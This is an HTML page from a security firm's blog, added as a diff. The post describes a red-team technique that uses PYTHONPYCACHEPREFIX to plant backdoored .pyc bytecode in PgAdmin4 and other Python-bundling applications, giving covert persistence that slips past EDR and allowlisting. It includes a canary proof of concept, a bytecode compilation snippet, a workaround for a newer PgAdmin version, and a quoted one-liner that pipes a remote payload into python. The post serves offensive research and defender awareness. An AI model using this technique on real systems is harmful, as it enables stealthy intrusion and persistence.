@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Abusing PYTHONPYCACHEPREFIX :: SRA Labs | Cybersecurity Research &amp; Innovation by Security Risk Advisors</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A good bit has been written about using high-level languages to obtain code execution and persistence within an environment. This post refines these techniques a bit further, discussing how `PYTHONPYCACHEPREFIX` can be used to obtain even more covert execution." />
+<meta name="keywords" content="offsec, persistence, python, pycache" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://labs.sra.io/posts/pythonpycacheprefix/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://labs.sra.io/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://labs.sra.io/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Abusing PYTHONPYCACHEPREFIX">
+<meta property="og:description" content="A good bit has been written about using high-level languages to obtain code execution and persistence within an environment. This post refines these techniques a bit further, discussing how `PYTHONPYCACHEPREFIX` can be used to obtain even more covert execution." />
+<meta property="og:url" content="https://labs.sra.io/posts/pythonpycacheprefix/" />
+<meta property="og:site_name" content="SRA Labs | Cybersecurity Research &amp; Innovation by Security Risk Advisors" />
+
+  
+  
+  <meta property="og:image" content="https://labs.sra.io/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2026-06-02 12:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script defer src="https://cloud.umami.is/script.js" data-website-id="89af426e-d0e1-4e07-bf23-2eafb2860ae9"></script>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css" integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+  
+
+
+</head>
+<body class="sraorange">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    SRA Labs
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+      
+      <li><a href="/posts/">Posts</a></li>
+      
+      
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      
+      
+      <li><a href="/advisories/">Advisories</a></li>
+      
+      
+      
+      <li><a href="/disclosure/">Disclosure</a></li>
+      
+      
+      
+      <li><a href="/conferences/">Conferences</a></li>
+      
+      
+      
+      <li><a href="https://sra.io/" target="_blank" data-umami-event="outlink-sra" data-umami-event-location="navbar">SRA.io</a></li>
+    </ul>
+  </li>
+</ul>
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+    
+    
+    
+    <li><a href="/posts/" >Posts</a></li>
+    
+    
+    
+    <li><a href="/tags/" >Tags</a></li>
+    
+    
+    
+    <li><a href="/advisories/" >Advisories</a></li>
+    
+    
+    
+    <li><a href="/disclosure/" >Disclosure</a></li>
+    
+    
+    
+    <li><a href="/conferences/" >Conferences</a></li>
+    
+    
+    
+    
+    <li><a href="https://sra.io/" target="_blank" data-umami-event="outlink-sra" data-umami-event-location="navbar">SRA.io</a></li>
+  </ul>
+</nav>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://labs.sra.io/posts/pythonpycacheprefix/">Abusing PYTHONPYCACHEPREFIX</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-06-02</time><span class="post-author">Jonn Callahan</span>
+    
+</div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://labs.sra.io/tags/offsec/">offsec</a>&nbsp;
+      
+      #<a href="https://labs.sra.io/tags/persistence/">persistence</a>&nbsp;
+      
+      #<a href="https://labs.sra.io/tags/python/">python</a>&nbsp;
+      
+      #<a href="https://labs.sra.io/tags/pycache/">pycache</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Using high-level languages for code execution and persistence has become a fairly popular trend as of late. I&rsquo;m reminded of <a href="https://trustedsec.com/blog/operating-inside-the-interpreted-offensive-python" target="_blank">this post</a> from TrustedSec talking about exactly this. The author discusses how to install Python to a Windows system and provides an overview of what kind of capabilities are available, including how to use <code>ctypes</code> for running unmanaged code. Commercial offensive tooling vendors like <a href="https://x.com/BallisKit/status/1848398358164971999" target="_blank">Balliskit</a> support Python payloads, and there are even full C2 implants built with it (<a href="https://github.com/MythicAgents/Medusa" target="_blank">Medusa</a>, <a href="https://github.com/naksyn/Pyramid" target="_blank">Pyramid</a>, <a href="https://github.com/nettitude/poshc2" target="_blank">PoshC2</a>).</p>
+<p>However, running PowerShell to install Python or even dropping arbitrary Python files to disk can be a risky endeavor within a well-hardened environment. We can do better.</p>
+<h1 id="lotl">LOTL<a href="#lotl" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>A few years back, I was performing a red team engagement against an exceptionally well-hardened environment. They&rsquo;re a client we&rsquo;ve worked with for a long time, and they&rsquo;ve taken all of our recommendations very seriously. Much to their benefit, and the loss of my sanity, the end user workstations had become about as well hardened as any reasonable enterprise could achieve. Tuned EDR, full allowlisting via WDAC, the works. Desperate and racking my brain for something novel, I started going through the applications available within the company portal. After pulling PgAdmin4 and looking through the assets that get installed, I noticed that a portable Python runtime was included.</p>
+
+  <figure class="center" >
+    <img src="pgadmin4.png"  alt="A portal Python runtime"   style="border-radius: 8px;"  />
+    
+  </figure>
+
+
+<p>This alone is a huge boon when fighting against EDR: executing directly from a trusted process in a trusted location. But we still need a means to actually load a payload. We could drop a file to disk and execute, but static file analysis very well may get you caught. You could obfuscate, but then you&rsquo;ve got to deal with entropy checks. You could also just invoke Python directly, dynamically loading the payload a la <code>curl https://example.com/payload.py | .\python.exe</code>. This obviously has all kinds of drawbacks related to cmd/PowerShell telemetry.</p>
+<h1 id="pythonpycacheprefix">PYTHONPYCACHEPREFIX<a href="#pythonpycacheprefix" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The Python3 runtime can be controlled in a number of ways, primarily through command line arguments and environment variables. You can find them documented <a href="https://docs.python.org/3/using/cmdline.html" target="_blank">here</a>. As the title suggests, we&rsquo;ll be looking at the <code>PYTHONPYCACHEPREFIX</code> environment variable. From the docs:</p>
+<blockquote>
+<p>If this is set, Python will write <code>.pyc</code> files in a mirror directory tree at this path, instead of in <code>__pycache__</code> directories within the source tree. This is equivalent to specifying the -X <code>pycache_prefix=PATH</code> option.</p>
+</blockquote>
+<p>Lets set this var to something we have write-access to. In this case: an AppData subdirectory.</p>
+
+  <figure class="center" >
+    <img src="env_var.png"  alt="Setting the PYTHONPYCACHEPREFIX env var"   style="border-radius: 8px;"  />
+    
+  </figure>
+
+
+<p>When launching the app, you&rsquo;ll see a number of new directories and <code>.pyc</code> files have been created.</p>
+
+  <figure class="center" >
+    <img src="cache_files_0.png"  alt="Cache files created"   style="border-radius: 8px;"  />
+    
+  </figure>
+
+
+
+  <figure class="center" >
+    <img src="cache_files_1.png"  alt="Cache files created"   style="border-radius: 8px;"  />
+    
+  </figure>
+
+
+<h1 id="generating-python-bytecode">Generating Python Bytecode<a href="#generating-python-bytecode" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Now we have a primitive for obtaining write-access to a trusted process&rsquo;s files. The next step is to weaponize it. This will involve backdooring the <code>.pyc</code> files themselves. These files can be dynamically created by using the <code>py_compile</code> native module (docs <a href="https://docs.python.org/3/library/py_compile.html#" target="_blank">here</a>). Importantly, as we&rsquo;re compiling to bytecode, the Python release we&rsquo;re using to generate these files needs to exactly match the environment we&rsquo;re targetting. For PgAdmin4 v9.11.1, this is Python 3.13.9.</p>
+<p>If you&rsquo;re not familiar with Python, the <code>___init.py___</code> file is a special initialization file that&rsquo;s invoked when a package is imported. Given its ubiquitous use, this makes it a great backdoor candidate. For our POC, we&rsquo;re going to create a simple canary file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;C:/Temp/canary.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;chirp&#34;</span>)
+</span></span></code></pre></div><p>We can then compile this into a <code>.pyc</code> file with the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> py_compile <span style="color:#f92672">import</span> compile, PycInvalidationMode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>infile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:/Users/titan/Desktop/example.py&#34;</span>
+</span></span><span style="display:flex;"><span>outfile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C:/Users/titan/Desktop/__init__.pyc&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>compile(infile, cfile<span style="color:#f92672">=</span>outfile, invalidation_mode<span style="color:#f92672">=</span>PycInvalidationMode<span style="color:#f92672">.</span>UNCHECKED_HASH)
+</span></span></code></pre></div><p>An important bit here is the <code>PycInvalidationMode.UNCHECKED_HASH</code> invalidation mode. This tells the Python runtime to always respect the cache file, even if the original <code>.py</code> file has been modified. This ensures the malicious <code>.pyc</code> persists. Now if we drop this file into the cache directory and reload the PgAdmin4 app, the canary file will be created. This will cause the app to just crash, but that&rsquo;s not surprising.</p>
+<p>Fully weaponizing this is fairly trivial. All we have to do is grab the original <code>___init__.py</code> file, add our malicious code, and recompile. To target the <code>pycache/Program Files/pgAdmin 4/web/pgadmin/__init__.cpython-313.pyc</code> cache file, we can pull the original from <code>C:/Program Files/pgAdmin 4/web/pgadmin/__init__.py</code>. Drop your malicious code right after the <code>import</code> statements, recompile, drop to disk, et voilà: you now have an implant executing within the context of the parent PgAdmin4 process.</p>
+<h1 id="a-note-on-pgadmin4-v9112">A Note on PgAdmin4 v9.11.2+<a href="#a-note-on-pgadmin4-v9112" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>I&rsquo;ve used this technique across several engagements at this point; it&rsquo;s a surprisingly common app to find within a company portal. However, when going to write this blog, I noticed that PgAdmin4 no longer writes the bytecode files to the expected location. This seems to have started with v9.11.2, which released in Feb 2026. The previous version, v9.11.1, and all other versions I&rsquo;ve tried this against, work as intended. Discussing with a coworker, it appears this <a href="https://github.com/pgadmin-org/pgadmin4/commit/6000cc0fb40971a9dd36c47e1eeb3b9bb6f7d2a3#diff-a44253f1e401f8e72af47caf141650994eedac28838375600d23abf3e812aa5aR233-R234" target="_blank">commit</a> introduced a &ldquo;macOS fix&rdquo; which disables bytecode generation. Ironically enough, this was enabled by using a different Python env var: <code>PYTHONDONTWRITEBYTECODE</code>. We can confirm this by pulling up the server log:</p>
+
+  <figure class="center" >
+    <img src="pythondontwritebytecode.png"  alt="PYTHONDONTWRITEBYTECODE enabled"   style="border-radius: 8px;"  />
+    
+  </figure>
+
+
+<p>But not all hope is lost. As the env var name suggests, this only disables <em>writing</em> bytecode and not <em>reading</em> bytecode. To verify this, I modified <code>C:/Program Files/pgAdmin 4/runtime/resources/app/src/js/pgadmin.js</code>, commenting out the <code>process.env.PYTHONDONTWRITEBYTECODE = '1';</code> line. Restarting the app generated the bytecode, and I created the same <code>___init__.cpython-313.pyc</code> POC as before. After restoring the <code>PYTHONDONTWRITEBYTECODE</code> env var and restarting the app, the canary file was successfully created.</p>
+<p>On a live engagement, you won&rsquo;t be able to modify the <code>pgadmin.js</code> file to entice the bytecode generation. However, you could do this on a machine you control and then push all the cache files onto the target machine. You could also opt to only drop the single malicious <code>.pyc</code> file. An EDR likely won&rsquo;t care whether there is a single <code>.pyc</code> or an entire directory tree&rsquo;s worth, but this may stand out to an adept incident response team.</p>
+<h1 id="on-other-applications">On Other Applications<a href="#on-other-applications" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>To be clear: this primitive is not specific to PgAdmin4. Any application that bundles or otherwise invokes a Python runtime from a user context could be exploited this way. A cursory glance shows that Sublime Text and GIMP use Python for plugin support. Alternatively, a Python developer and all their tooling could be targetted this way, including JupyterLabs Desktop. As long as the target cache file maps to a file that is regularly executed by the user, it can be used as a means of peristence.</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+
+      <span><a title="Privacy Policy" href="/privacy" target="_blank">Privacy</a></span>
+      <span>:: <a title="Main Site" href="https://sra.io" target="_blank" data-umami-event="outlink-sra" data-umami-event-location="footer"><i class="fa-solid fa-globe"></i></a></span>
+      <span>&nbsp;:: <a title="RSS" href="/index.xml" target="_blank" data-umami-event="inlink-rss" data-umami-event-location="footer"><i class="fa-solid fa-square-rss"></i></a></span>
+      <span>&nbsp;:: <a title="GitHub" href="https://github.com/SecurityRiskAdvisors" target="_blank" data-umami-event="outlink-github" data-umami-event-location="footer"><i class="fa-brands fa-github"></i></a></span>
+      <span>&nbsp;:: <a title="X/Twitter" href="https://x.com/secrisk" target="_blank" data-umami-event="outlink-twitter" data-umami-event-location="footer"><i class="fa-brands fa-x-twitter"></i></a></span>
+      <span>&nbsp;:: <a title="LinkedIn" href="https://www.linkedin.com/company/security-risk-advisors" target="_blank" data-umami-event="outlink-linkedin" data-umami-event-location="footer"><i class="fa-brands fa-linkedin"></i></a></span>
+      <span style="width: 100%; text-align: center;"><a title="Theme repo" href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> by <a title="Theme author" href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
